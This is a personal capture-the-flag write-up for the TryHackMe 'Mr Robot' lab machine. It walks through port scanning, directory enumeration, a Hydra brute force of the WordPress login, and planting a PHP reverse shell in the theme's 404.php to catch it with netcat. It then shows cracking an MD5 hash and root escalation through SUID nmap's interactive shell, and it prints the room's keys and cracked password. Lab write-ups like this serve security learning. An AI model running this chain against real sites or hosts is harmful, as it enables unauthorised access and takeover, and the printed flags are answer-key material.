- - - 
created : 27-07-2025 

Tags : #medium #detailed 
- - - 
# Objective

Based on the Mr. Robot show, can you root this box?

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?
# Recon
## Rustscan - Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) to scan the target IP (added in /etc/hosts file):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/MrRobot]
└─$ rustscan -a mrrobot.thm -- -A            
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.133.235:22
Open 10.10.133.235:80
Open 10.10.133.235:443

PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack ttl 63 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache

443/tcp open  ssl/http syn-ack ttl 63 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16:3b19:87c3:42ad:6634:c1c9:d0aa:fb97
| SHA-1: ef0c:5fa5:931a:09a5:687c:a2c2:80c4:c792:07ce:f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
```
# Enumeration
## HTTP (80)

### Gobuster

We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/MrRobot]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -u http://mrrobot.thm                 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mrrobot.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 218]
/.hta                 (Status: 403) [Size: 213]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://mrrobot.thm/0/]
/Image                (Status: 301) [Size: 0] [--> http://mrrobot.thm/Image/]
/admin                (Status: 301) [Size: 233] [--> http://mrrobot.thm/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://mrrobot.thm/feed/atom/]
/audio                (Status: 301) [Size: 233] [--> http://mrrobot.thm/audio/]
/blog                 (Status: 301) [Size: 232] [--> http://mrrobot.thm/blog/]
/css                  (Status: 301) [Size: 231] [--> http://mrrobot.thm/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://mrrobot.thm/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://mrrobot.thm/feed/]
/image                (Status: 301) [Size: 0] [--> http://mrrobot.thm/image/]
/images               (Status: 301) [Size: 234] [--> http://mrrobot.thm/images/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://mrrobot.thm/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 230] [--> http://mrrobot.thm/js/]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://mrrobot.thm/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://mrrobot.thm/]
/phpmyadmin           (Status: 403) [Size: 94]
/rdf                  (Status: 301) [Size: 0] [--> http://mrrobot.thm/feed/rdf/]
/readme               (Status: 200) [Size: 64]
/render/https://www.google.com (Status: 301) [Size: 0] [--> http://mrrobot.thm/render/https:/www.google.com]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://mrrobot.thm/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://mrrobot.thm/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 233] [--> http://mrrobot.thm/video/]
/wp-admin             (Status: 301) [Size: 236] [--> http://mrrobot.thm/wp-admin/]
/wp-content           (Status: 301) [Size: 238] [--> http://mrrobot.thm/wp-content/]
/wp-config            (Status: 200) [Size: 0]
/wp-cron              (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 239] [--> http://mrrobot.thm/wp-includes/]
/wp-load              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-login             (Status: 200) [Size: 2599]
/wp-settings          (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> http://mrrobot.thm/wp-login.php?action=register]
/wp-mail              (Status: 500) [Size: 3064]
/xmlrpc               (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================

```

So we have [Wordpress](../../3%20-%20Tags/Hacking%20Concepts/Wordpress.md).

Visiting the main [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) :

![Pasted image 20250727155653.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727155653.png)

![Pasted image 20250727160142.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727160142.png)

Creepy.. leave me alone please!

Visiting /robots.txt we see a .dictionary file :

![Pasted image 20250727193822.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727193822.png)

Let's try to see it :

![Pasted image 20250727193906.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727193906.png)

Seems a user or pass list, we'll copy that to our working directory in a file with [Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md), we also retrieve the ==**first key**== :

![Pasted image 20250727201543.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727201543.png)

And the login page :

![Pasted image 20250727160410.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727160410.png)

We have username enumeration :

![Pasted image 20250727160731.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727160731.png)

### Caido

We can use [Caido](../../3%20-%20Tags/Hacking%20Tools/Caido.md) (or [BurpSuite](../../3%20-%20Tags/Hacking%20Tools/BurpSuite.md)) to enumerate usernames, we intercept the request and send it to automate :

![Pasted image 20250727195130.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727195130.png)

Here we set a [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) position and our dictionary file, we'll upload that in files section :

![Pasted image 20250727195338.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727195338.png)

![Pasted image 20250727195606.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727195606.png)

We click on run and wait for a different response filtering them for lenght :

![Pasted image 20250727195828.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727195828.png)

And we have the username: `Elliot` , let's try the same process but for password (same dictionary file) :

![Pasted image 20250727202254.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727202254.png)

We run it and filter again, we can wait but too much time.
### Hydra

We'll use [Hydra](../../3%20-%20Tags/Hacking%20Tools/Hydra.md) to get faster :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/MrRobot]
└─$ hydra -l Elliot -P list.txt 10.10.208.142  -m "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"  http-post-form -t 30 

ER28-0652
```

And we got it .

Now we can log in :

![Pasted image 20250727211150.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250727211150.png)
# Exploit
## Reverse Shell Upload

We can upload files, let's try a simply [php](../../3%20-%20Tags/Programming%20Languages/php.md) [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md), you can find it here https://github.com/pentestmonkey/php-reverse-shell,
make sure to change IP and port to your desires, we copy and paste in the editor in 404.php file and click on Update File :

![Pasted image 20250728124536.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728124536.png)
## Netcat 

Now we just open a listener on the same port we choose previously with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and open the file on the browser :

http://mrrobot.thm/404.php

![Pasted image 20250728124736.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728124736.png)

We are daemon user .
# Lateral Movement - Privilege Escalation
## Daemon to Robot

We can find a [MD5](../../3%20-%20Tags/Hacking%20Concepts/MD5.md) password in /home/robot :

```bash
$ cd /home/robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
### Hashcat 

We can use [Hashcat](../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) to crack the password , This is an MD5 hash. The hash mode for MD5 in hashcat is 0 :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/MrRobot]
└─$ nano  pass   

┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/MrRobot]
└─$ hashcat -a 0 -m 0 pass /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

```

Now we can switch user with the password :

```bash
$ su robot
Password: abcdefghijklmnopqrstuvwxyz

whoami
robotcat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

And we have the ==**second key**==.
## Robot to Root

### Shell Stabilization

First thing we perform a [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) to work better, we'll use [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) :

```bash
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'                                                                           
robot@ip-10-10-53-252:~$ ^Z                                                                                              
zsh: suspended  nc -lvnp 1337                                                                                            
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/MrRobot]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               reset

```

Now we can check for permissions :

```bash
robot@ip-10-10-53-252:~$ sudo -l
[sudo] password for robot: 
Sorry, try again.
[sudo] password for robot: 
Sorry, user robot may not run sudo on ip-10-10-53-252.
```

So Robot doesn’t have permission to run sudo command.

We can search for SUID files. To search the a system for these type of files run the following: `find / -perm -u=s -type f 2>/dev/null` :

```bash
robot@ip-10-10-53-252:~$ find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

We have [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) here, strange.
### GTFObins

We can search for nmap on [GTFObins](../../3%20-%20Tags/Hacking%20Tools/GTFObins.md) :

![Pasted image 20250728140630.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728140630.png)

We go to /usr/local/bin and do that (b) to retrieve the **==third key==** :

```bash
robot@ip-10-10-53-252:/usr/local/bin$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
root@ip-10-10-53-252:/usr/local/bin# whoami
root
root@ip-10-10-53-252:/usr/local/bin# cat /root/key-3-of-3.txt 
04787ddef27c3dee1ee161b21670b4e4
root@ip-10-10-53-252:~# cat hacked
'You have been hacked by mdn0x'
```

Pwned.